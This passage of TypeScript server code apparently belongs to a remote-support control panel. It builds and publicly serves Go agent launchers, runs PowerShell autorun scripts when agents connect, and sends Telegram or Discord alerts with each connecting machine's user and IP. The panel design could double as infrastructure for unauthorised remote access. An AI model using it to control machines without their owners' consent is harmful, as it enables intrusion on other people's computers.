      if (!_lncGo125) {
        return json({
          error: "Build toolchain not installed",
          details: "Go 1.25.0 SDK not found. Click ⚙ Install Toolchains in the Build Output panel, then retry.",
        }, 500);
      }

      const lncExistingPath = process.env.PATH || "";
      const lncPath = [lncGo125Bin!, lncExistingPath].join(":");

      const env: Record<string, string> = {
        ...Object.fromEntries(Object.entries(process.env).filter(([,v]) => v !== undefined && v !== "") as [string, string][]),
        GOOS:        targetOS,
        GOARCH:      targetArch,
        CGO_ENABLED: "0",
        HOME:        homeDir,
        GOTELEMETRY: "off",
        GONOSUMDB:   "*",
        GOFLAGS:     "-mod=vendor",
        GOTOOLCHAIN: "local",
        GOROOT:      _lncGo125,
        PATH:        lncPath,
      };
      const buildCmd = ["go", "build", "-mod=vendor", "-buildvcs=false", "-trimpath", "-ldflags", ldflags.join(" "), "-o", outPath, "./cmd/launcher"];

      // Pre-flight: go vet catches missing imports / compile errors before the
      // real build so failures surface fast with a readable message.
      {
        const lncGoBin = path.join(_lncGo125, "bin", "go");
        const vetCmd = [lncGoBin, "vet", "-mod=vendor", "./cmd/launcher"];
        let vetProc: ReturnType<typeof Bun.spawn>;
        try {
          vetProc = Bun.spawn(vetCmd, { cwd: clientDir, env, stderr: "pipe", stdout: "pipe" });
        } catch (e: any) {
          return json({ error: "Build failed", details: `go vet could not start: ${e?.message ?? e}` }, 500);
        }
        const vetStderr = vetProc.stderr as ReadableStream<Uint8Array> | null | undefined;
        const [vetExit, vetErr] = await Promise.all([
          vetProc.exited,
          vetStderr ? new Response(vetStderr).text() : Promise.resolve(""),
        ]);
        if (vetExit !== 0) {
          console.error("[build/launcher] go vet failed:", vetErr);
          return json({ error: "Build failed", details: `Source error (go vet):\n${vetErr.slice(0, 2000)}` }, 500);
        }
      }

      let proc: ReturnType<typeof Bun.spawn>;
      try {
        proc = Bun.spawn(buildCmd, { cwd: clientDir, env, stderr: "pipe", stdout: "pipe" });
      } catch (spawnErr: any) {
        return json({ error: "Build failed", details: spawnErr?.message || String(spawnErr) }, 500);
      }
      const killTimer = setTimeout(() => { try { proc.kill(); } catch {} }, 120_000);
      const stderrStream = proc.stderr as ReadableStream<Uint8Array> | null | undefined;
      const [exitCode, errText] = await Promise.all([
        proc.exited,
        stderrStream ? new Response(stderrStream).text() : Promise.resolve(""),
      ]);
      clearTimeout(killTimer);
      if (exitCode !== 0) {
        return json({ error: "Build failed", details: errText.slice(0, 2000) }, 500);
      }

      try { mkdirSync(BUILDS_DIR, { recursive: true }); } catch {}
      copyFileSync(outPath, cachedPath);
      try { unlinkSync(outPath); } catch {}
      buildSha256 = await computeFileSha256(cachedPath);

      const now = Date.now();
      buildStore.set(buildId, {
        id: buildId, filename: outName,
        platform: `launcher-${targetOS}-${targetArch}`, version: SERVER_VERSION,
        created_at: now, expires: now + BUILD_TTL_MS, sha256: buildSha256,
      });
      saveBuildManifest();
    }

    return json({
      ok: true, buildId, filename: outName,
      platform: `launcher-${targetOS}-${targetArch}`,
      sha256: buildSha256,
      dlUrl: `${publicURL}/api/launcher/dl?platform=${targetOS}-${targetArch}`,
      cached: existsSync(cachedPath),
    });
  }

  // ---------------------------------------------------------------
  // GET /api/launcher/dl?platform=<os>-<arch>
  //
  // Public download for the reputation-stable launcher built by
  // /api/build/launcher. Unauthenticated — the whole point is for
  // every PC in the fleet to fetch the SAME bytes from the SAME URL.
  // ---------------------------------------------------------------
  if (pathname === "/api/launcher/dl" && method === "GET") {
    const platform = (url.searchParams.get("platform") || "windows-amd64").toLowerCase();
    // Find the launcher build for this platform — there is at most one
    // active cache entry per (publicURL, os, arch) and the URL is
    // baked into the cache key, so a simple scan is fine.
    let found: StoredBuild | undefined;
    for (const b of buildStore.values()) {
      if (b.platform === `launcher-${platform}`) { found = b; break; }
    }
    if (!found) return new Response(`Launcher not built yet for ${platform}. Call POST /api/build/launcher first.`, { status: 404 });
    const filePath = path.join(BUILDS_DIR, found.id);
    if (!existsSync(filePath)) return new Response("Launcher file missing.", { status: 404 });
    return new Response(Bun.file(filePath), {
      headers: {
        "Content-Type": getMimeType(found.filename),
        "Content-Disposition": `attachment; filename="${found.filename}"; filename*=UTF-8''${encodeURIComponent(found.filename)}`,
      },
    });
  }

  // ── Build History API ─────────────────────────────────────────────
  if (pathname === "/api/builds" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const httpBase = detectPublicBase(req).http;
    const builds = [...buildStore.values()]
      .sort((a, b) => b.created_at - a.created_at)
      .map(b => ({ ...b, dlUrl: `${httpBase}/api/agent/dl?id=${b.id}` }));
    return json(builds);
  }

  if (pathname.startsWith("/api/builds/") && method === "DELETE") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const buildId = pathname.slice("/api/builds/".length);
    const b = buildStore.get(buildId);
    if (!b) return json({ error: "Not found" }, 404);
    try { unlinkSync(path.join(BUILDS_DIR, buildId)); } catch {}
    buildStore.delete(buildId);
    for (const [platform, bid] of latestBuilds) {
      if (bid === buildId) { latestBuilds.delete(platform); break; }
    }
    saveBuildManifest();
    return json({ ok: true });
  }

  // ── DELETE /api/builds — clear ALL cached builds at once ─────────────────
  if (pathname === "/api/builds" && method === "DELETE") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const ids = [...buildStore.keys()];
    for (const id of ids) {
      try { unlinkSync(path.join(BUILDS_DIR, id)); } catch {}
      buildStore.delete(id);
    }
    latestBuilds.clear();
    saveBuildManifest();
    return json({ ok: true, cleared: ids.length });
  }

  // ── Settings: Security Policy ─────────────────────────────────────────────

  if (pathname === "/api/settings/security" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const s = loadAppSettings();
    return json({ security: s.security ?? defaultSecurity() });
  }

  if (pathname === "/api/settings/security" && method === "PUT") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const cur = loadAppSettings();
    const prev = cur.security ?? defaultSecurity();
    const updated: SecurityConfig = {
      sessionTtlHours:        Number(body.sessionTtlHours        ?? prev.sessionTtlHours),
      loginMaxAttempts:       Number(body.loginMaxAttempts        ?? prev.loginMaxAttempts),
      loginWindowMinutes:     Number(body.loginWindowMinutes      ?? prev.loginWindowMinutes),
      loginLockoutMinutes:    Number(body.loginLockoutMinutes     ?? prev.loginLockoutMinutes),
      passwordMinLength:      Number(body.passwordMinLength       ?? prev.passwordMinLength),
      passwordRequireUppercase: Boolean(body.passwordRequireUppercase ?? prev.passwordRequireUppercase),
      passwordRequireLowercase: Boolean(body.passwordRequireLowercase ?? prev.passwordRequireLowercase),
      passwordRequireNumber:    Boolean(body.passwordRequireNumber    ?? prev.passwordRequireNumber),
      passwordRequireSymbol:    Boolean(body.passwordRequireSymbol    ?? prev.passwordRequireSymbol),
    };
    saveAppSettings({ ...cur, security: updated });
    return json({ security: updated });
  }

  // ── Settings: TLS / SSL ───────────────────────────────────────────────────

  if (pathname === "/api/settings/tls" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const s = loadAppSettings();
    return json({ tls: s.tls ?? { certbot: defaultTlsCertbot() } });
  }

  if (pathname === "/api/settings/tls" && method === "PUT") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const cur = loadAppSettings();
    const prev = cur.tls?.certbot ?? defaultTlsCertbot();
    const cb = body.certbot ?? {};
    const updated: TlsCertbotConfig = {
      enabled:      typeof cb.enabled === "boolean" ? cb.enabled : prev.enabled,
      domain:       String(cb.domain      ?? prev.domain).trim(),
      email:        String(cb.email       ?? prev.email).trim(),
      httpsPort:    typeof cb.httpsPort === "number" ? cb.httpsPort : prev.httpsPort,
      livePath:     String(cb.livePath    ?? prev.livePath).trim(),
      certFileName: String(cb.certFileName ?? prev.certFileName).trim(),
      keyFileName:  String(cb.keyFileName  ?? prev.keyFileName).trim(),
      caFileName:   String(cb.caFileName   ?? prev.caFileName).trim(),
    };
    saveAppSettings({ ...cur, tls: { certbot: updated } });
    return json({ tls: { certbot: updated } });
  }

  if (pathname === "/api/settings/tls/certbot/setup" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const cur = loadAppSettings();
    const cb = cur.tls?.certbot ?? defaultTlsCertbot();
    const domain = cb.domain.trim();
    const email = cb.email.trim();
    if (!domain) return json({ error: "Domain is required. Set it in TLS settings first." }, 400);
    if (!email) return json({ error: "Email is required for certbot. Set it in TLS settings first." }, 400);

    const certbotBin = (() => {
      for (const p of ["/usr/bin/certbot", "/usr/local/bin/certbot", "/snap/bin/certbot"]) {
        if (existsSync(p)) return p;
      }
      return null;
    })();
    if (!certbotBin) {
      return json({ error: "certbot not found on this host. Install it with: apt-get install certbot" }, 501);
    }

    try {
      const certbotProc = Bun.spawn([
        certbotBin, "certonly",
        "--standalone",
        "--non-interactive",
        "--agree-tos",
        "--email", email,
        "--domain", domain,
        "--http-01-port", "80",
        "--quiet",
      ], { stdout: "pipe", stderr: "pipe" });

      const [certbotExit, certbotOut, certbotErr] = await Promise.all([
        certbotProc.exited,
        certbotProc.stdout ? new Response(certbotProc.stdout as ReadableStream<Uint8Array>).text() : Promise.resolve(""),
        certbotProc.stderr ? new Response(certbotProc.stderr as ReadableStream<Uint8Array>).text() : Promise.resolve(""),
      ]);

      if (certbotExit !== 0) {
        const details = (certbotErr + certbotOut).trim().slice(0, 2000);
        return json({ error: "certbot failed", details }, 500);
      }

      const livePath = cb.livePath || "/etc/letsencrypt/live";
      const certPath = path.join(livePath, domain, cb.certFileName || "fullchain.pem");
      const keyPath  = path.join(livePath, domain, cb.keyFileName  || "privkey.pem");

      if (!existsSync(certPath) || !existsSync(keyPath)) {
        return json({ error: "certbot succeeded but cert files not found at expected path", certPath, keyPath }, 500);
      }

      const updated: TlsCertbotConfig = { ...cb, enabled: true };
      saveAppSettings({ ...cur, tls: { certbot: updated } });
      await tryStartTlsServer(updated);
      return json({ ok: true, certPath, keyPath, message: "TLS certificate obtained and HTTPS server started." });
    } catch (e: any) {
      return json({ error: "certbot execution failed", details: e?.message || String(e) }, 500);
    }
  }

  if (pathname === "/api/settings/tls/apply" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const cur = loadAppSettings();
    const cb = cur.tls?.certbot ?? defaultTlsCertbot();
    if (!cb.enabled) return json({ error: "TLS is not enabled in settings." }, 400);
    try {
      await tryStartTlsServer(cb);
      return json({ ok: true, message: "HTTPS server started (or reloaded)." });
    } catch (e: any) {
      return json({ error: "Failed to start TLS server", details: e?.message || String(e) }, 500);
    }
  }

  // ── Settings: Appearance (Custom CSS) ────────────────────────────────────

  if (pathname === "/api/settings/appearance" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const s = loadAppSettings();
    return json({ customCSS: s.customCSS ?? "", appName: s.appName ?? DEFAULT_APP_NAME });
  }

  if (pathname === "/api/settings/appearance" && method === "PUT") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const cur = loadAppSettings();
    const next: AppSettings = { ...cur };
    if (typeof body.customCSS === "string") {
      next.customCSS = body.customCSS.slice(0, 51200);
    }
    if (typeof body.appName === "string") {
      const trimmed = body.appName.trim().slice(0, 60);
      next.appName = trimmed || DEFAULT_APP_NAME;
    }
    saveAppSettings(next);
    return json({ customCSS: next.customCSS ?? "", appName: next.appName ?? DEFAULT_APP_NAME });
  }

  // Public, unauthenticated — needed on the login page before a session exists.
  if (pathname === "/api/branding" && method === "GET") {
    const s = loadAppSettings();
    const logoPath = path.join(DATA_DIR, "custom-logo");
    return json({
      appName: s.appName ?? DEFAULT_APP_NAME,
      hasCustomLogo: existsSync(logoPath),
    });
  }

  // ── Branding: custom logo ─────────────────────────────────────────────────

  // GET /api/branding/logo — serve the custom logo (public, unauthenticated)
  if (pathname === "/api/branding/logo" && method === "GET") {
    const logoPath = path.join(DATA_DIR, "custom-logo");
    if (!existsSync(logoPath)) {
      // Redirect to the bundled default logo
      return new Response(null, { status: 302, headers: { Location: "/assets/logo.png" } });
    }
    const s = loadAppSettings();
    const mime = s.logoMime || "image/png";
    return new Response(Bun.file(logoPath), {
      headers: {
        "Content-Type": mime,
        "Cache-Control": "no-cache, no-store, must-revalidate",
      },
    });
  }

  // POST /api/branding/logo — upload a new logo (admin only, multipart/form-data)
  if (pathname === "/api/branding/logo" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let form: FormData;
    try { form = await req.formData(); } catch { return json({ error: "Invalid form data" }, 400); }
    const file = form.get("logo");
    if (!file || typeof file === "string") return json({ error: "No logo file provided" }, 400);

    const MAX_SIZE = 2 * 1024 * 1024; // 2 MB
    const buf = Buffer.from(await file.arrayBuffer());
    if (buf.byteLength === 0) return json({ error: "Empty file." }, 400);
    if (buf.byteLength > MAX_SIZE) return json({ error: "Logo must be ≤ 2 MB." }, 400);

    // Detect image type from magic bytes — never trust client-supplied MIME.
    // SVG is intentionally excluded: it is active XML content and could carry
    // stored-XSS payloads when served from the same origin.
    let detectedMime: string | null = null;
    if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4E && buf[3] === 0x47) {
      detectedMime = "image/png";
    } else if (buf[0] === 0xFF && buf[1] === 0xD8 && buf[2] === 0xFF) {
      detectedMime = "image/jpeg";
    } else if (buf.length >= 6 && buf.slice(0, 6).toString("ascii").startsWith("GIF8")) {
      detectedMime = "image/gif";
    } else if (buf.length >= 12 &&
               buf.slice(0, 4).toString("ascii") === "RIFF" &&
               buf.slice(8, 12).toString("ascii") === "WEBP") {
      detectedMime = "image/webp";
    } else if (buf[0] === 0x00 && buf[1] === 0x00 && buf[2] === 0x01 && buf[3] === 0x00) {
      detectedMime = "image/x-icon";
    }

    if (!detectedMime) {
      return json({ error: "Unsupported or unrecognised image format. Allowed: PNG, JPEG, GIF, WEBP, ICO." }, 400);
    }

    mkdirSync(DATA_DIR, { recursive: true });
    const logoPath = path.join(DATA_DIR, "custom-logo");
    writeFileSync(logoPath, buf);
    const s = loadAppSettings();
    saveAppSettings({ ...s, logoMime: detectedMime });
    return json({ ok: true });
  }

  // DELETE /api/branding/logo — reset to the default logo (admin only)
  if (pathname === "/api/branding/logo" && method === "DELETE") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const logoPath = path.join(DATA_DIR, "custom-logo");
    try { if (existsSync(logoPath)) unlinkSync(logoPath); } catch {}
    const s = loadAppSettings();
    const { logoMime: _, ...rest } = s as any;
    saveAppSettings(rest);
    return json({ ok: true });
  }

  // ── Auto-run Scripts ─────────────────────────────────────────────────────

  if (pathname === "/api/scripts/autorun" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    return json(loadAutorunScripts());
  }

  if (pathname === "/api/scripts/autorun" && method === "POST") {
    if (!auth || auth.role === "viewer") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const name = typeof body.name === "string" ? body.name.trim() : "";
    const content = typeof body.content === "string" ? body.content.trim() : "";
    const type = typeof body.type === "string" ? body.type : "powershell";
    const trigger: AutorunScript["trigger"] = body.trigger === "on_first_connect" ? "on_first_connect" : "on_connect";
    if (!name || !content) return json({ error: "name and content are required" }, 400);
    const scripts = loadAutorunScripts();
    const existing = scripts.find(s => s.name.toLowerCase() === name.toLowerCase());
    if (existing) {
      existing.content = content; existing.type = type; existing.trigger = trigger; existing.updatedAt = Date.now();
      saveAutorunScripts(scripts);
      return json(existing);
    }
    const script: AutorunScript = {
      id: `ar-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      name, content, type, trigger, enabled: true,
      createdAt: Date.now(), updatedAt: Date.now(),
    };
    scripts.push(script);
    saveAutorunScripts(scripts);
    return json(script);
  }

  if (/^\/api\/scripts\/autorun\/[^/]+$/.test(pathname) && method === "PUT") {
    if (!auth || auth.role === "viewer") return json({ error: "Forbidden" }, 403);
    const arId = pathname.split("/").pop()!;
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const scripts = loadAutorunScripts();
    const s = scripts.find(x => x.id === arId);
    if (!s) return json({ error: "Not found" }, 404);
    if (typeof body.enabled === "boolean") s.enabled = body.enabled;
    if (body.trigger === "on_first_connect" || body.trigger === "on_connect") s.trigger = body.trigger;
    if (typeof body.name === "string" && body.name.trim()) s.name = body.name.trim();
    if (typeof body.content === "string" && body.content.trim()) s.content = body.content.trim();
    if (typeof body.type === "string") s.type = body.type;
    s.updatedAt = Date.now();
    saveAutorunScripts(scripts);
    return json(s);
  }

  if (/^\/api\/scripts\/autorun\/[^/]+$/.test(pathname) && method === "DELETE") {
    if (!auth || auth.role === "viewer") return json({ error: "Forbidden" }, 403);
    const arId = pathname.split("/").pop()!;
    saveAutorunScripts(loadAutorunScripts().filter(s => s.id !== arId));
    return json({ ok: true });
  }

  // ── Notifications: event feed ─────────────────────────────────────────────

  if (pathname === "/api/notifications" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const limit = Math.min(200, Math.max(1, parseInt(url.searchParams.get("limit") ?? "50", 10) || 50));
    return json(getNotifHistory(limit));
  }

  if (pathname === "/api/notifications/mark-read" && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    markAllNotifsRead();
    return json({ ok: true });
  }

  // ── Settings: Notifications ──────────────────────────────────────────────

  if (pathname === "/api/settings/notifications" && method === "GET") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    return json(loadNotificationConfig());
  }

  if (pathname === "/api/settings/notifications" && method === "PUT") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const saved = saveNotificationConfig({
      discordWebhookUrl:  typeof body.discordWebhookUrl  === "string" ? body.discordWebhookUrl.trim()  : undefined,
      telegramBotToken:   typeof body.telegramBotToken   === "string" ? body.telegramBotToken.trim()   : undefined,
      telegramChatId:     typeof body.telegramChatId     === "string" ? body.telegramChatId.trim()     : undefined,
      notifyOnConnect:    typeof body.notifyOnConnect    === "boolean" ? body.notifyOnConnect    : undefined,
      notifyOnDisconnect: typeof body.notifyOnDisconnect === "boolean" ? body.notifyOnDisconnect : undefined,
    });
    return json(saved);
  }

  if (pathname === "/api/settings/notifications/test" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const { notifyAgentConnect: testNotify } = await import("./notifier");
    await testNotify({
      host: "test-machine",
      os: "Windows 11",
      username: "testuser",
      ip: "1.2.3.4",
      buildTag: body.buildTag || "test",
    });
    return json({ ok: true });
  }

  // ── Settings: Export (full) ───────────────────────────────────────────────

  if (pathname === "/api/settings/export" && method === "GET") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const s = loadAppSettings();
    const payload = JSON.stringify({ version: SERVER_VERSION, ...s }, null, 2);
    return new Response(payload, {
      headers: {
        "Content-Type": "application/json",
        "Content-Disposition": `attachment; filename="nubyone-settings-${Date.now()}.json"`,
      },
    });
  }

  // ── Settings: Import ──────────────────────────────────────────────────────

  if (pathname === "/api/settings/import" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const cur = loadAppSettings();
    const applied: string[] = [];
    const warnings: string[] = [];
    if (body.security && typeof body.security === "object") {
      cur.security = { ...defaultSecurity(), ...body.security };
      applied.push("security");
    }
    if (body.tls?.certbot && typeof body.tls.certbot === "object") {
      cur.tls = { certbot: { ...defaultTlsCertbot(), ...body.tls.certbot } };
      applied.push("tls");
    }
    if (typeof body.customCSS === "string") {
      cur.customCSS = body.customCSS.slice(0, 51200);
      applied.push("customCSS");
    }
    if (typeof body.appName === "string") {
      cur.appName = body.appName.trim().slice(0, 60) || DEFAULT_APP_NAME;
      applied.push("appName");
    }
    saveAppSettings(cur);
    return json({ ok: true, applied, warnings });
  }

  return new Response("Not found", { status: 404 });
}

let _tlsServer: ReturnType<typeof Bun.serve> | null = null;

async function tryStartTlsServer(cb?: TlsCertbotConfig): Promise<void> {
  const config = cb ?? (loadAppSettings().tls?.certbot ?? defaultTlsCertbot());
  if (!config.enabled || !config.domain) return;

  const livePath = config.livePath || "/etc/letsencrypt/live";
  const certPath = path.join(livePath, config.domain, config.certFileName || "fullchain.pem");
  const keyPath  = path.join(livePath, config.domain, config.keyFileName  || "privkey.pem");

  if (!existsSync(certPath) || !existsSync(keyPath)) {
    console.warn(`[TLS] Certificate files not found: ${certPath}, ${keyPath} — HTTPS server not started.`);
    return;
  }

  let cert: string, key: string;
  try {
    cert = readFileSync(certPath, "utf-8");
    key  = readFileSync(keyPath,  "utf-8");
  } catch (e: any) {
    console.warn(`[TLS] Failed to read cert/key files: ${e?.message || e}`);
    return;
  }

  const httpsPort = config.httpsPort || 443;
  const serverConfig = getConfig();

  if (_tlsServer) {
    try { _tlsServer.stop(true); } catch {}
    _tlsServer = null;
  }

  try {
    _tlsServer = Bun.serve<SocketData>({
      port: httpsPort,
      hostname: serverConfig.host,
      tls: { cert, key },
      idleTimeout: 255,
      async fetch(req, server) {
        const agentUpgradeResult = tryAgentWsUpgrade(req, server);
        if (agentUpgradeResult === true) return undefined;
        if (agentUpgradeResult === false) return new Response("WebSocket upgrade failed", { status: 500 });
        const wsUpgrade = await handleWsUpgrade(req, server);
        if (wsUpgrade !== undefined) return wsUpgrade;
        return handleRequest(req);
      },
      websocket: { ...wsHandler, perMessageDeflate: false, idleTimeout: 120 },
    });
    console.log(`[TLS] HTTPS server started on port ${httpsPort} for domain ${config.domain}`);
  } catch (e: any) {
    console.error(`[TLS] Failed to start HTTPS server: ${e?.message || e}`);
  }
}

export function startServer() {
  const config = getConfig();
  ensureAdminUser();

  // Keep all WebSocket connections alive through proxies.
  // Sends a WebSocket-level PING frame every 20 seconds so no connection
  // hits the Replit proxy idle timeout (~60s). This covers agents, viewers,
  // and console viewers — all connection types.
  setInterval(() => {
    try { pingAllAgents(); } catch {}
    try { pingAllConsoleViewers(); } catch {}
    try { pingAllRemoteViewers(); } catch {}
  }, 20_000);

  const server = Bun.serve<SocketData>({
    port: config.port,
    hostname: config.host,
    reusePort: true,
    idleTimeout: 255,
    async fetch(req, server) {
      const url = new URL(req.url);

      // Agent WebSocket upgrade MUST happen synchronously (no await allowed
      // before server.upgrade() in Bun — the request object is invalidated
      // after the first event-loop yield).
      const agentUpgradeResult = tryAgentWsUpgrade(req, server);
      if (agentUpgradeResult === true) return undefined; // upgraded OK
      if (agentUpgradeResult === false) {
        return new Response("WebSocket upgrade failed", { status: 500 });
      }

      // Non-agent WebSocket upgrades (console viewer, notifications) need
      // auth checks which are async — handled here after the sync path above.
      const wsUpgrade = await handleWsUpgrade(req, server);
      if (wsUpgrade !== undefined) return wsUpgrade;

      return handleRequest(req);
    },
    websocket: { ...wsHandler, perMessageDeflate: false, idleTimeout: 120 },
  });

  console.log("========================================");
  console.log("  Nubyone Remote Support Server");
  console.log("========================================");
  console.log(`  HTTP:  http://${server.hostname}:${server.port}`);
  console.log(`  Login: ${config.adminUser} / ${config.adminPass}`);
  console.log("========================================");

  // Start TLS server if configured and certs are present.
  tryStartTlsServer().catch(e => console.warn("[TLS] startup error:", e?.message || e));

  return server;
}
